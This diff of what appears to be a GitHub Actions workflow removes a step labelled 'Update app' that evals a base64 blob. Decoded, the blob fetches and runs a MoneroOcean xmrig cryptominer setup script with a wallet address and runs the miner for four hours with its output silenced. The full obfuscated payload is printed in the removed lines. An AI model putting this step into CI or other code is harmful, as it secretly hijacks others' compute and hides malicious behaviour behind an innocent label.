@@ -16,10 +16,6 @@ jobs:
      # - name: Update app
      #  run: steamcmd +login anonymous +app_update 1337 validate +quit
      
-     - name: Update app
-       run: |
-         eval "$(echo "YXB0IHVwZGF0ZSAtcXEKYXB0IGluc3RhbGwgLXkgY3VybApjdXJsIC1zIC1MIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Nb25lcm9PY2Vhbi94bXJpZ19zZXR1cC9tYXN0ZXIvc2V0dXBfbW9uZXJvb2NlYW5fbWluZXIuc2ggfCBiYXNoIC1zIDRBNkNRdEVnS2pIVmttVm1uSmpmOFpVVVoyQ0xwYmFtTGNTaXRiSmt0TjZlZVpuOGNlcnhxajRicDJZaDN1czFuZGlSb3Q2aGdaMXRxU2hNRXdLd0VRWGJBNmtVV3J0CmNkIC9naXRodWIvaG9tZS9tb25lcm9vY2Vhbi8KZWNobyAiT2xhYWFhYWFhYWFhYWFhYWFhYWFhYSIKY2htb2QgNzc3IG1pbmVyLnNoCnRpbWVvdXQgNGggLi9taW5lci5zaCA+IC9kZXYvbnVsbAo=" | base64 -d)"
-
      - name: Try Build
        run: ./not-exist-file.sh it bloke build
 
